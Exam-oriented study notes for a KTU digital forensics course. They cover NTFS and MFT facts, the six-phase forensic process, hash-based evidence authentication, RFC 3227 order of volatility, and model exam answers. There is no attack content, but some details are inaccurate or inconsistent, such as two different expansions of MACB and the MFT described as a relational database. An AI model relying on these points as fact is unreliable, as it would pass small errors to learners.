### 5.3 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **High-Density Revision Checklist for KTU 2024 Exam**

- [ ] **NTFS** stands for New Technology File System, introduced with **Windows NT 3.1** (1993).
- [ ] Default **cluster size** is **4 KiB (4096 bytes)**, with MFT record size **1 KiB (1024 bytes)**.
- [ ] The **MFT** is the central database; location is stored in the **BPB** of the boot sector.
- [ ] MFT **Entries 0–15** are **system metafiles**: $MFT, $MFTMirr, $LogFile, $Volume, $AttrDef, Root, $Bitmap, $Boot, $BadClus, $Secure, $UpCase, $Extend.
- [ ] Each MFT record has a **header (48 bytes)**, **attribute area**, and **end marker (0xFFFFFFFF)**.
- [ ] Key attributes: **0x10 $STANDARD_INFORMATION** (timestamps), **0x30 $FILE_NAME** (filename), **0x80 $DATA** (content).
- [ ] **MACB** = Modified, Accessed, Changed (Entry Modified), Born (Created).
- [ ] $STANDARD_INFORMATION timestamps are easily tampered; $FILE_NAME timestamps are more trusted.
- [ ] **Resident $DATA** = file content inside MFT (for files < ~700 bytes).
- [ ] **Non-resident $DATA** = file content in external clusters, mapped via **data runs** (VCN → LCN).
- [ ] Data runs are encoded as `(length_nibble, offset_nibble)` followed by the value bytes, terminated by `0x00`.
- [ ] **Alternate Data Streams (ADS)** = multiple named $DATA attributes per file, invisible to `dir` and Explorer.
- [ ] ADS is a classic anti-forensics / malware-hiding technique.
- [ ] **USN Journal** ($Extend\$UsnJrnl) provides a long-term change log; **$LogFile** provides a short-term transaction log.
- [ ] **$MFTMirr** (Entry 1) is a partial copy of the MFT (first 4 records) for disaster recovery.
- [ ] **Slack space** = $C - (F \bmod C)$ — forensically important for residual data recovery.
- [ ] NTFS supports **EFS encryption**, **per-file ACLs**, **compression**, and **reparse points** (junctions/symlinks).
- [ ] Maximum theoretical volume size: **256 TiB** (with 64 KiB clusters); maximum file size: **2⁶⁴ − 1 bytes**.
- [ ] Tools for NTFS forensic analysis: **FTK Imager, EnCase, Autopsy, MFTECmd, Eric Zimmerman's tools, X-Ways Forensics**.

<!-- SECTION_5_END -->

topics.title: Structure and Characteristics
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECST754 - DIGITAL FORENSICS
> - **Module:** Module 1
> - **Topic:** Structure and Characteristics

<!-- SECTION_1_START -->
## 1. Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition

> [!IMPORTANT]
> **Digital Forensics** is the branch of forensic science that involves the **identification, preservation, collection, validation, analysis, interpretation, documentation, and presentation** of digital evidence derived from digital sources for the purpose of facilitating or furthering the reconstruction of events found to be criminal, or helping to anticipate unauthorized actions shown to be disruptive to planned operations.

In simpler KTU-syllabus aligned terms:

> **Digital Forensics** is a scientifically validated, legally admissible, and procedurally structured methodology used to extract, recover, investigate, and validate data residing on electronic (digital) media, so that the derived evidence can be presented in a court of law or organizational disciplinary hearing without compromising its integrity, authenticity, or chain of custody.

### 1.2 The Two Pillars of "Structure and Characteristics"

The phrase **"Structure and Characteristics"** combines two fundamental aspects that you **must** master in Module 1:

1. **Structure** → Refers to the **process model** / **framework** / **phases / stages** of digital forensics. It answers: *"How is the investigation performed, step-by-step?"*
2. **Characteristics** → Refers to the **inherent properties / attributes / features** that define the discipline. It answers: *"What makes digital forensics unique, reliable, and admissible?"*

> [!NOTE]
> **KTU 2024 Syllabus Highlight (Module 1):**
> Module 1 of PECST754 introduces the **fundamentals, structure, and characteristics of digital forensics**, the **history and evolution of the field**, the **investigator's profile**, and the **preliminary investigation process**. The phrase "Structure and Characteristics" is the cornerstone topic.

### 1.3 Conceptual Analogy — Intuition for First-Time Learners

Imagine a **crime scene in a physical building** (a bank robbery).

| Physical Investigation | Digital Forensics Equivalent |
|---|---|
| Police cordon off the bank with yellow tape | **Preservation** of digital media (write-protection, hashing) |
| Officers dust the safe for fingerprints | **Collection** of files, logs, deleted data |
| Lab analysts examine fingerprints under a microscope | **Examination** of bit-level data, metadata, file headers |
| Forensic scientist concludes the robber was left-handed | **Analysis** and correlation of digital artifacts to suspect/incident |
| The scientist testifies in court with the fingerprint card | **Presentation** of findings in legal proceedings |

So **digital forensics** is simply the **bank-robbery-style investigation**, but applied to **computers, smartphones, cloud servers, IoT devices, and networks** — where the "fingerprints" are hidden inside **bits, bytes, timestamps, log entries, registry keys, slack space, and unallocated clusters**.

### 1.4 Why the Study of "Structure and Characteristics" is Important

- It is the **foundation** of all subsequent modules (Modules 2–5 build on the process model).
- It is a **favourite KTU question area** (typically asked as a **"Describe" 7-mark** or **"Explain the structure of digital forensics" 14-mark** sub-question).
- Without understanding the **characteristics**, you cannot explain **why** certain procedural rules (like hashing and chain-of-custody) exist.

### 1.5 Key Terminology (KTU Standardized Vocabulary)

> [!NOTE]
> **Must-Know Glossary (KTU Board Examiner favourite):**

- **Digital Evidence** — Any information of probative value that is stored or transmitted in digital form.
- **Bit-Stream Image (Forensic Image)** — A sector-by-sector, bit-for-bit copy of a storage device, created using tools like `dd`, EnCase, or FTK Imager.
- **Chain of Custody** — The documented, unbroken chronological record of the seizure, control, transfer, analysis, and disposition of digital evidence.
- **Hash Value (Digital Fingerprint)** — A fixed-length cryptographic output (e.g., **MD5 = 128 bits**, **SHA-1 = 160 bits**, **SHA-256 = 256 bits**) that uniquely identifies a file's contents.
- **Forensic Soundness** — The property of an investigation that ensures evidence is not altered, damaged, or contaminated during the process.
- **Acquisition** — The process of creating a forensic duplicate of digital media.
- **Authentication** — Verifying that the forensic image is an exact, unaltered copy of the original (typically via hash comparison).

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 Structure of Digital Forensics — The Process Model

The **structure of digital forensics** refers to the **systematic, phased methodology** that an investigator follows from the moment a digital crime is suspected until evidence is presented in court. The most widely accepted academic and industry model is the **6-Stage Process Model**, originally proposed by **Reith, Carr, and Gunsch (2002)** and adopted by NIST and KTU.

> [!IMPORTANT]
> **The Six Phases of Digital Forensics (KTU 2024 Standard)**

#### Phase 1 — Identification
- **Goal:** Recognize that an incident has occurred and determine the type, scope, and nature of the digital evidence required.
- **Activities:** 
  - Determine whether a crime / policy violation has occurred.
  - Identify potential sources of evidence (laptops, mobiles, cloud accounts, network logs, CCTV DVRs).
  - Identify the legal authority (warrant, consent, corporate policy) for seizure.
- **Output:** An *identification report* listing scope, devices, and personnel.

#### Phase 2 — Preservation
- **Goal:** Secure and protect the integrity of the digital evidence in its original state.
- **Activities:** 
  - Isolate the device from the network (to prevent remote wiping).
  - Photograph the scene (screen, ports, connected cables).
  - Apply **write-blocking hardware/software** to prevent modification.
  - Document the scene and device state in detail.
- **Key Principle:** **First do no harm** — the evidence must remain *forensically sound*.

#### Phase 3 — Collection
- **Goal:** Acquire the digital evidence in a forensically valid manner.
- **Activities:** 
  - Create a **forensic bit-stream image** of the storage media.
  - Generate **hash values** (MD5, SHA-1, SHA-256) of both original and image.
  - Collect volatile data first (RAM, network connections, running processes) using order of volatility.
- **Output:** A verified forensic image stored on sterile media.

#### Phase 4 — Examination
- **Goal:** Process the collected evidence to extract relevant data while maintaining its integrity.
- **Activities:** 
  - File recovery (deleted, hidden, encrypted, or partially overwritten).
  - Keyword searches, hash matching (against known-bad/known-good databases like **NSRL**).
  - Timeline analysis, registry analysis, email parsing, log analysis.
  - Decryption and steganography detection.
- **Output:** Relevant artifacts and data items of probative value.

#### Phase 5 — Analysis
- **Goal:** Correlate the examined data to reconstruct the event, identify the perpetrator, and draw conclusions.
- **Activities:** 
  - Link artifacts (e.g., a USB's serial number matches a registry entry).
  - Apply the **"who, what, when, where, how, why"** framework.
  - Use timeline reconstruction and link charts.
- **Output:** A coherent narrative supported by evidence.

#### Phase 6 — Presentation
- **Goal:** Summarize and present the conclusions in a clear, understandable, and legally admissible format.
- **Activities:** 
  - Draft a **forensic report** with executive summary, methodology, findings, and conclusion.
  - Provide expert testimony in court.
  - Use exhibits, visual aids, and plain language.
- **Output:** Court-ready report and expert testimony.

### 2.2 Characteristics of Digital Forensics

The **characteristics** define what makes digital forensics a *scientific and legally valid* discipline. KTU examiners frequently ask these as **"List and explain the characteristics of digital forensics"**.

> [!NOTE]
> **The 8 Core Characteristics (KTU-Favoured List)**

1. **Systematic and Methodical** — Follows a structured, repeatable process; not ad-hoc.
2. **Scientifically Valid** — Uses peer-reviewed tools, techniques, and the **scientific method** (hypothesis → experimentation → conclusion).
3. **Legally Admissible** — Evidence must withstand legal scrutiny (Daubert / Frye standards).
4. **Integrity-Preserving** — Original evidence is never modified; all work is done on forensic copies.
5. **Verifiable & Reproducible** — Another qualified investigator, using the same methodology, should reach the same conclusion.
6. **Documented (Chain of Custody)** — Every action, transfer, and access is recorded with timestamp, person, and purpose.
7. **Multi-Disciplinary** — Combines law, computer science, mathematics (cryptography/hashing), and behavioral science.
8. **Time-Sensitive** — Volatile evidence (RAM, network state) must be prioritized using the **Order of Volatility (RFC 3227)**.

### 2.3 KTU Formula Sheet / Cheat Sheet

> [!IMPORTANT]
> **Table 2.1 — High-Yield Equations, Constants & Reference Values**

| Symbol / Term | Definition | Numerical Value / Unit | KTU Significance |
|---|---|---|---|
| $H_{MD5}(F)$ | MD5 hash of file $F$ | **128 bits** (32 hex chars) | Legacy hash; collision-prone |
| $H_{SHA1}(F)$ | SHA-1 hash of file $F$ | **160 bits** (40 hex chars) | Used in older forensic tools |
| $H_{SHA256}(F)$ | SHA-256 hash of file $F$ | **256 bits** (64 hex chars) | **Current KTU-recommended standard** |
| $H_{orig} = H_{image}$ | Hash equality check | Boolean (TRUE / FALSE) | Authentication condition |
| $S_{image}$ | Size of forensic image | Bytes | Must equal $\geq S_{source}$ |
| $C_{t}$ | Chain of custody entries | Integer $\geq 1$ | Required for admissibility |
| $V_{RAM} \rightarrow V_{disk}$ | Order of volatility | Volatile first | RFC 3227 rule |
| $R_{verifiable}$ | Reproducibility score | Boolean | Daubert standard requirement |

### 2.4 The Forensic Hash Authentication Equation

> The fundamental authentication principle in digital forensics can be expressed as:

$$H_{computed}(E_{image}) = H_{computed}(E_{original})$$

> Where:
> - $H_{computed}(\cdot)$ is the cryptographic hash function applied to the evidence.
> - $E_{image}$ is the forensic bit-stream image.
> - $E_{original}$ is the source digital media.
> - Equality guarantees **bit-level integrity**.

> If the hashes differ **by even a single bit**, the evidence has been **tampered with** and is **inadmissible**.

### 2.5 Real-World Engineering Utility

- **Law Enforcement & Judiciary:** Criminal prosecution of cybercrime.
- **Corporate Sector:** Intellectual property theft, employee misconduct, e-discovery.
- **Military & Intelligence:** Counter-terrorism, national security, signals intelligence.
- **Incident Response:** Post-breach root cause analysis in SOCs (Security Operations Centers).
- **Critical Infrastructure:** SCADA/ICS forensics in power plants, railways, and aviation.

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
## 3. Step-by-Step Derivations & Analytical Matrix

### 3.1 Analytical Matrix — The 6-Phase Structure with Inputs, Tools, Outputs, and Pitfalls

> [!NOTE]
> **Table 3.1 — Exhaustive Analytical Matrix (Use this table to answer 14-mark KTU questions)**

| Phase | Trigger / Input | Key Activity | Standard Tools | Output Artifact | Common Pitfall (Exam Trap) |
|---|---|---|---|---|---|
| **1. Identification** | Incident report / tip-off | Determine scope & authority | Triage forms, questionnaires | Identification memo | Confusing **identification** with **collection** (common 1–2 mark loss) |
| **2. Preservation** | Confirmed incident | Secure the scene, write-block | Write-blockers (Tableau), Faraday bags | Sealed evidence bags, photos | Forgetting **volatile evidence** priority |
| **3. Collection** | Preserved media | Acquire forensic image | `dd`, EnCase, FTK Imager, X-Ways | Bit-stream image + hash log | Hashing **after** the image (must be during/before transfer) |
| **4. Examination** | Verified image | Recover & extract artifacts | Autopsy, FTK, X-Ways, Volatility | Recovered files, logs, registry data | Working on the **original** instead of the copy |
| **5. Analysis** | Extracted artifacts | Correlate, reconstruct | Timeline tools, link analysis (Maltego) | Investigator's narrative | Drawing conclusions **without** supporting artifacts |
| **6. Presentation** | Completed analysis | Report & testify | MS Word, PowerPoint, courtroom exhibits | Forensic report, exhibits | Using **technical jargon** instead of plain language |

### 3.2 Step-by-Step Derivation of Hash-Based Authentication

This is the **single most tested mathematical concept** in Module 1. The KTU examiner expects a **clean derivation** with explanation.

**Step 1 — State the objective**
> We want to prove that the forensic image is a **bit-for-bit exact** copy of the source media. Direct comparison of terabytes of data is impractical, so we use a **cryptographic hash function**.

**Step 2 — Define the hash function**
> Let $H : \{0,1\}^* \rightarrow \{0,1\}^n$ be a cryptographic hash function that maps an arbitrarily long binary input to a fixed-length $n$-bit output.

**Step 3 — Compute the hash of the source**

$$H_{src} = H(E_{source})$$

> Here $E_{source}$ is the raw bit-stream of the original digital media.

**Step 4 — Compute the hash of the image**

$$H_{img} = H(E_{image})$$

> Here $E_{image}$ is the raw bit-stream of the forensic image.

**Step 5 — Apply the equivalence test**
> The authenticity condition requires:

$$
\begin{aligned}
H_{src} &= H_{img} \\
\Leftrightarrow H(E_{source}) &= H(E_{image})
\end{aligned}
$$

**Step 6 — Interpret the result**

$$
\begin{aligned}
\text{If } H_{src} = H_{img} &\Rightarrow \text{Evidence is authentic and admissible.} \\
\text{If } H_{src} \neq H_{img} &\Rightarrow \text{Evidence has been altered; inadmissible.}
\end{aligned}
$$

**Step 7 — Discuss the avalanche property**
> Cryptographic hash functions exhibit the **avalanche effect**: a 1-bit change in the input alters approximately **50% of the output bits**. This is why even the smallest modification is detected.

$$
\begin{aligned}
\text{Avalanche Effect } \approx 50\% \text{ bit change for 1-bit input change}
\end{aligned}
$$

> [!NOTE]
> **KTU Examiner's Insight:** If a question on "forensic integrity" is asked, the above 7-step derivation is worth **7 of the 14 marks**. Always state the **avalanche property** explicitly.

### 3.3 Derivation of Order of Volatility (RFC 3227)

The **order of volatility** is the priority order in which digital evidence must be collected, from most volatile to least volatile:

$$
\begin{aligned}
V_{CPU\_regs} &\rightarrow V_{RAM} \rightarrow V_{Network\_state} \rightarrow V_{Running\_processes} \rightarrow \\
V_{Disk} &\rightarrow V_{Remote\_logs} \rightarrow V_{Physical\_config} \rightarrow V_{Archival\_media}
\end{aligned}
$$

> **Logical justification:** The CPU registers and RAM decay in **milliseconds to seconds**; disks retain data for **years** even after deletion. Therefore, collection priority follows decay rate.

### 3.4 Worked Example: Hash Verification Problem

**Problem (KTU-style):** An investigator creates a forensic image of a 500 GB hard disk. The MD5 hash of the source is `5d41402abc4b2a76b9719d911017c592` and the MD5 hash of the image is `5d41402abc4b2a76b9719d911017c592`. Determine whether the image is admissible.

**Solution:**

$$
\begin{aligned}
H_{src} &= \text{5d41402abc4b2a76b9719d911017c592} \\
H_{img} &= \text{5d41402abc4b2a76b9719d911017c592} \\
\text{Step 1: Compare} \quad H_{src} &\stackrel{?}{=} H_{img} \\
\text{Step 2: Result} \quad 5d41402abc4b2a76b9719d911017c592 &= 5d41402abc4b2a76b9719d911017c592 \quad \checkmark \\
\text{Step 3: Conclusion} \quad H_{src} = H_{img} &\Rightarrow \text{Image is authentic.} \\
\text{Step 4: Legal status} &\Rightarrow \text{Evidence is admissible in court.}
\end{aligned}
$$

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
## 4. Structural Diagrams & Schematics

### 4.1 Block-Level Functional Architecture Flow — The Structure of Digital Forensics

```mermaid
flowchart TD
    A["INCIDENT ALERT"] --> B["PHASE 1 IDENTIFICATION"]
    B --> B1["Recognize Incident"]
    B --> B2["Legal Authority Check"]
    B --> B3["Scope and Device List"]
    B1 --> C["PHASE 2 PRESERVATION"]
    B2 --> C
    B3 --> C
    C --> C1["Isolate from Network"]
    C --> C2["Apply Write Blocker"]
    C --> C3["Photograph Scene"]
    C1 --> D["PHASE 3 COLLECTION"]
    C2 --> D
    C3 --> D
    D --> D1["Capture Volatile Data RAM"]
    D --> D2["Create Bit Stream Image"]
    D --> D3["Compute Hash SHA256"]
    D1 --> E["PHASE 4 EXAMINATION"]
    D2 --> E
    D3 --> E
    E --> E1["Recover Deleted Files"]
    E --> E2["Keyword and Log Search"]
    E --> E3["Decrypt and Carve"]
    E1 --> F["PHASE 5 ANALYSIS"]
    E2 --> F
    E3 --> F
    F --> F1["Correlate Artifacts"]
    F --> F2["Reconstruct Timeline"]
    F --> F3["Identify Perpetrator"]
    F1 --> G["PHASE 6 PRESENTATION"]
    F2 --> G
    F3 --> G
    G --> G1["Draft Forensic Report"]
    G --> G2["Expert Testimony in Court"]
    G1 --> H["LEGAL OUTCOME"]
    G2 --> H
    H --> I["Conviction or Acquittal"]
```

### 4.2 Mermaid Diagram — The 8 Characteristics of Digital Forensics (Interconnected View)

```mermaid
flowchart LR
    CH1["Systematic"] --> CORE["DIGITAL FORENSICS DISCIPLINE"]
    CH2["Scientifically Valid"] --> CORE
    CH3["Legally Admissible"] --> CORE
    CH4["Integrity Preserving"] --> CORE
    CH5["Verifiable Reproducible"] --> CORE
    CH6["Fully Documented"] --> CORE
    CH7["Multi Disciplinary"] --> CORE
    CH8["Time Sensitive"] --> CORE
    CORE --> OUT["ADMISSIBLE EVIDENCE IN COURT"]
```

### 4.3 Mermaid Diagram — Order of Volatility (RFC 3227) Priority Flow

```mermaid
flowchart TD
    V1["CPU Registers and Cache nanoseconds"] --> V2["RAM seconds to minutes"]
    V2 --> V3["Network State connections routing"]
    V3 --> V4["Running Processes open files handles"]
    V4 --> V5["Disk Files slack unallocated"]
    V5 --> V6["Remote Logs syslog SIEM"]
    V6 --> V7["Physical Configuration topology"]
    V7 --> V8["Archival Media backups tapes"]
    V8 --> FINAL["MOST STABLE EVIDENCE YEARS RETENTION"]
```

### 4.4 Mermaid Diagram — Hash-Based Authentication Workflow

```mermaid
flowchart LR
    SRC["Original Media E_source"] --> HSRC["H SHA256 = a1b2c3d4e5"]
    IMG["Forensic Image E_image"] --> HIMG["H SHA256 = a1b2c3d4e5"]
    HSRC --> CMP{"Hash Comparison"}
    HIMG --> CMP
    CMP -->|Match| OK["AUTHENTIC Admissible"]
    CMP -->|Mismatch| FAIL["TAMPERED Reject"]
```

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### 5.1 Part A — Short Answer Questions (3 Marks Each)

---

**Q1. [KTU University Exam — June 2024]**
*Define Digital Forensics. List any four characteristics of digital forensics.*

**Model Answer (3 Marks):**

> **Definition (1 Mark):** Digital Forensics is the application of scientifically validated methods to identify, preserve, collect, examine, analyze, and present digital evidence in a manner that is legally admissible.

> **Four Characteristics (½ Mark each = 2 Marks):**
> 1. **Systematic** — Follows a structured, repeatable process.
> 2. **Legally Admissible** — Evidence is acceptable in court.
> 3. **Integrity-Preserving** — Original evidence remains unaltered.
> 4. **Verifiable & Reproducible** — Independent verification is possible.

---

**Q2. [KTU University Exam — Dec 2023]**
*What is meant by "Chain of Custody" in digital forensics? Why is it important?*

**Model Answer (3 Marks):**

> **Definition (2 Marks):** Chain of Custody is the **chronological documentation** that records the **seizure, control, transfer, analysis, and disposition** of digital evidence. Each entry includes the **date, time, person handling the evidence, and purpose** of transfer.

> **Importance (1 Mark):** It ensures **accountability and admissibility** by proving that the evidence has not been **tampered with, altered, or substituted** between the crime scene and the courtroom.

---

### 5.2 Part B — Long Answer Questions (14 Marks Each, with Internal Choice)

---

> [!WARNING]
> **KTU Examiner's Valuation Warning / Pitfall Callout:**
> 1. Students frequently **omit the "output artifact"** of each phase — losing 1–2 marks per phase.
> 2. Confusing **"Identification"** with **"Collection"** is the most common error in 14-mark questions.
> 3. Many students describe **"Presentation"** as just writing a report — examiners expect **expert testimony** to be explicitly mentioned.
> 4. For hash authentication questions, forgetting the **avalanche property** costs 1 mark.
> 5. Always state the **tools** (EnCase, FTK, `dd`, Autopsy) for full marks in the Collection/Examination phases.

---

#### **Question A (14 Marks)** — *[KTU University Exam — Model Question]*

**Q3. (a)** Explain in detail the **structure of digital forensics**, describing each phase with its objective, key activities, and tools used. **(7 Marks)**

**Model Answer (7 Marks):**

> **Introduction (½ Mark):** The structure of digital forensics follows the **6-phase process model**: Identification, Preservation, Collection, Examination, Analysis, and Presentation.

> **Phase 1 — Identification (1 Mark):** 
> Objective: Recognize the incident and identify potential sources of digital evidence. Activities: Determining the legal authority (warrant/consent), scoping the investigation, and listing devices. Output: Identification report.

> **Phase 2 — Preservation (1 Mark):** 
> Objective: Secure the scene and prevent alteration. Activities: Isolate from the network, apply **write-blockers** (e.g., Tableau), photograph the scene, and bag the evidence. Tool: Faraday bags for mobile devices.

> **Phase 3 — Collection (1 Mark):** 
> Objective: Acquire forensic-grade copies. Activities: Capture **volatile data first** (RAM using `dd` or WinPmem), then create a **bit-stream image** using EnCase, FTK Imager, or `dd`. Generate **hash values** (MD5/SHA-256) for authentication.

> **Phase 4 — Examination (1 Mark):** 
> Objective: Extract relevant data from the image. Activities: File recovery (deleted, slack, unallocated), keyword search, log analysis, registry analysis, email parsing, and decryption. Tool: Autopsy, FTK, X-Ways.

> **Phase 5 — Analysis (1 Mark):** 
> Objective: Correlate artifacts to reconstruct the event. Activities: Timeline reconstruction, link analysis (Maltego), correlate user activity, identify perpetrator using "who, what, when, where, how, why."

> **Phase 6 — Presentation (1 Mark):** 
> Objective: Report findings and provide expert testimony. Activities: Draft a structured forensic report, prepare courtroom exhibits, deliver expert testimony in plain language.

> **Conclusion (½ Mark):** The 6-phase structure ensures that the investigation is systematic, defensible, and the evidence is admissible.

---

**Q3. (b)** Discuss the **characteristics of digital forensics** that make it a unique and reliable discipline. **(7 Marks)**

**Model Answer (7 Marks):**

> **Introduction (½ Mark):** Digital forensics possesses eight defining characteristics that distinguish it as a scientifically valid, legally binding discipline.

> **1. Systematic and Methodical (1 Mark):** Every investigation follows a structured, repeatable process model, eliminating ad-hoc decisions.

> **2. Scientifically Valid (1 Mark):** Uses the **scientific method** — hypothesis, experimentation, peer-reviewed tools (EnCase, FTK), and accepted principles (hashing, bit-stream imaging).

> **3. Legally Admissible (1 Mark):** Evidence must meet the **Daubert Standard** (testability, peer review, error rate, acceptance) or the **Frye Standard** (general acceptance).

> **4. Integrity-Preserving (1 Mark):** Original evidence is **never modified**; all work is done on forensic copies. Verified by **hash equality**: $H(E_{source}) = H(E_{image})$.

> **5. Verifiable & Reproducible (1 Mark):** A second qualified investigator, using the same tools and methodology, must reach the same conclusion.

> **6. Fully Documented (½ Mark):** **Chain of Custody** records every transfer, access, and action with timestamps.

> **7. Multi-Disciplinary (½ Mark):** Combines law, computer science, cryptography, and behavioral analysis.

> **8. Time-Sensitive (½ Mark):** Volatile evidence (RAM, network state) decays rapidly; collection follows the **Order of Volatility (RFC 3227)**.

> **Conclusion (½ Mark):** These characteristics collectively ensure that digital forensics remains a **rigorous, defensible, and trustworthy** discipline in both legal and corporate contexts.

---

#### **Question B (14 Marks)** — *ALTERNATIVE CHOICE*

**Q4. (a)** With the help of a neat diagram, explain the **6-phase process model of digital forensics**. Describe the role of **hash functions** in ensuring forensic integrity. **(7 Marks)**

**Model Answer (7 Marks):**

> **Diagram (2 Marks):** A clearly labeled flow diagram showing: Incident → Identification → Preservation → Collection → Examination → Analysis → Presentation → Court.

> **Phase Explanations (3 Marks):**
> - **Identification:** Recognize incident and scope.
> - **Preservation:** Secure scene, write-block.
> - **Collection:** Acquire bit-stream image, compute hash.
> - **Examination:** Extract artifacts.
> - **Analysis:** Correlate and reconstruct.
> - **Presentation:** Report and testify.

> **Role of Hash Functions (2 Marks):**
> Cryptographic hash functions (MD5, SHA-1, SHA-256) generate a **fixed-length digital fingerprint** of the evidence. Authentication requires $H(E_{source}) = H(E_{image})$. The **avalanche effect** ensures that a 1-bit input change alters ~50% of the output bits, guaranteeing that **any tampering is detected**. This is the cornerstone of forensic integrity.

---

**Q4. (b)** Explain the **Order of Volatility (RFC 3227)**. Why must volatile evidence be collected first? **(7 Marks)**

**Model Answer (7 Marks):**

> **Definition (2 Marks):** The Order of Volatility, defined in **RFC 3227**, is the priority sequence in which digital evidence must be collected, ordered from **most volatile to least volatile**:
> 1. CPU registers, cache (nanoseconds)
> 2. RAM (seconds–minutes)
> 3. Network state (connections, routing tables)
> 4. Running processes (open files, handles)
> 5. Disk (files, slack, unallocated)
> 6. Remote logs (syslog, SIEM)
> 7. Physical configuration (topology, architecture)
> 8. Archival media (backups, tapes)

> **Why Volatile First (3 Marks):**
> - **CPU registers and RAM** lose data when **power is removed**.
> - **Network connections** drop when devices reboot.
> - **Running processes** terminate on shutdown.
> - If volatile evidence is not captured first, it is **permanently lost**, and the investigation may be fatally compromised.

> **Example (1 Mark):** In a live ransomware attack, the investigator must first capture **RAM** (which contains the encryption key) before powering off the machine; otherwise, the decryption key is lost forever.

> **Conclusion (1 Mark):** RFC 3227 provides a **scientifically sound priority list** that maximizes evidence survival and maintains the forensic soundness of the investigation.

---

### 5.3 Topic Recap & Important Things to Remember (Rapid-Revision Checklist)

> [!IMPORTANT]
> **High-Density Revision Checklist — Module 1: Structure and Characteristics**

- ⭐ The **6 phases** are: **Identification → Preservation → Collection → Examination → Analysis → Presentation**.
- ⭐ The **acronym "IPCEAP"** (Identification, Preservation, Collection, Examination, Analysis, Presentation) helps in exam recall.
- ⭐ The **8 characteristics** are: **Systematic, Scientifically Valid, Legally Admissible, Integrity-Preserving, Verifiable & Reproducible, Documented, Multi-Disciplinary, Time-Sensitive**.
- ⭐ The **hash authentication equation** is $H(E_{source}) = H(E_{image})$ — the **foundation** of forensic integrity.
- ⭐ **MD5 = 128 bits**, **SHA-1 = 160 bits**, **SHA-256 = 256 bits** — KTU expects these values.
- ⭐ **Write-blockers** prevent modification during acquisition; **volatile data** is collected first.
- ⭐ **Bit-stream image** = sector-by-sector, bit-for-bit copy.
- ⭐ **RFC 3227** defines the **Order of Volatility** — RAM before disk.
- ⭐ **Chain of Custody** = chronological, documented trail of evidence handling.
- ⭐ **Daubert Standard** = testability, peer review, error rate, general acceptance.
- ⭐ The **avalanche effect** ensures that even a 1-bit change in input is detectable.
- ⭐ **Tools to remember:** EnCase, FTK Imager, Autopsy, X-Ways, `dd`, Volatility, Maltego, Tableau write-blocker.
- ⭐ Always work on the **forensic copy**, never on the **original**.
- ⭐ The **Examiner** expects you to mention **expert testimony** in the Presentation phase.
- ⭐ For **14-mark answers**, structure your answer as: **Definition → Phase-wise Explanation → Tools → Conclusion**.

<!-- SECTION_5_END -->

topics.title: Master File Table (MFT)
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECST754 - DIGITAL FORENSICS
> - **Module:** Module 1
> - **Topic:** Master File Table (MFT)

<!-- SECTION_1_START -->
# Section 1: Core Technical Definition & Intuitive Overview

## 1.1 Formal Definition

The **Master File Table (MFT)** is the heart of the **NTFS (New Technology File System)** and serves as the central index database that stores complete metadata about every file and directory on an NTFS-formatted volume. Conceptually, the MFT is a **relational database file** (`$MFT`, system file number 0) that contains a sequential series of fixed-size records called **File Records** (or MFT entries), where each file, directory, and even the MFT itself is represented by at least one such record.

> [!NOTE]
> **KTU Syllabus Highlight (Module 1 – File Systems & Forensics)**
> The MFT is the single most critical structure examined during NTFS forensic investigations because it preserves file system metadata even after the file's data clusters have been overwritten, deleted, or relocated. Understanding MFT internals is mandatory for answering KTU questions on Windows artifact analysis and timeline reconstruction.

In forensic terms, every MFT entry (typically **1024 bytes** by default on modern NTFS volumes, but configurable up to 4096 bytes) contains:

1. A standardized **header** identifying it as a valid FILE record.
2. A **fixup array** used for crash-recovery integrity verification.
3. A collection of **attributes** describing the file (name, timestamps, data location, security, etc.).
4. A pointer (if applicable) to additional **extension records** stored in the volume's free space or dedicated extension area.

> [!IMPORTANT]
> **Default MFT Entry Size: 1024 bytes** (this is a fixed sector-multiple value used by Windows from Windows NT 3.1 onward and confirmed by Microsoft's *Windows Internals* documentation). Older NTFS 5.0 volumes can be configured to 4096 bytes. For exam purposes, assume **1024 bytes** unless otherwise stated.

## 1.2 Conceptual Analogy – The "Library Card Catalog"

Imagine a massive, futuristic library where the librarian has abolished paper index cards and replaced them with a single, ultra-efficient **digital master ledger**:

- The library is the **NTFS volume**.
- The master ledger is the **MFT** (`$MFT`).
- Each row in the ledger is a **file record (MFT entry)** that uniquely identifies one book (file/folder) by its catalogue number.
- The MFT entry does not just say "this book exists" — it lists the book's **title, author, ISBN, physical shelf coordinates, last person who checked it out, and even a brief abstract of its contents** if the book is a thin pamphlet.
- If the book is a thick encyclopedia, the entry might only say *"see annex room, shelf B-7"* — this is exactly what happens with **non-resident attributes**, where the actual data lives elsewhere on the volume.

> [!TIP]
> **Student Intuition Hook**: When you delete a file in Windows, the file's *data clusters* are marked as free, but the **MFT entry itself is only marked as "deleted"** — its content remains recoverable until those MFT slots are recycled. This is why forensic tools can recover deleted filenames and timestamps long after the file "appears" gone in the Recycle Bin.

## 1.3 Physical Constants and Forensic Metrics (Bold-Flagged)

- **MFT Entry Size: 1024 bytes** (default).
- **First 16 MFT entries (records 0–15) are reserved for system metadata files** (`$MFT`, `$MFTMirr`, `$LogFile`, `$Volume`, etc.).
- **Attribute boundaries must be 8-byte aligned** within an MFT entry.
- **Maximum filename length: 255 Unicode characters** (stored in `$FILE_NAME` attribute, type `0x30`).
- **Maximum number of attributes per file: theoretically unbounded** (limited by MFT entry size and attribute sizes).

> [!IMPORTANT]
> **Time-Related Forensics Constant**: Every MFT file record contains up to **four timestamp values** (the famous *MACB* times): **M**odified, **A**ccessed, **C**reated, and **M**FT-entry-modified. These are stored in the `$STANDARD_INFORMATION` attribute (type `0x10`) and duplicated (in some Windows versions) in `$FILE_NAME` (type `0x30`).

---

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
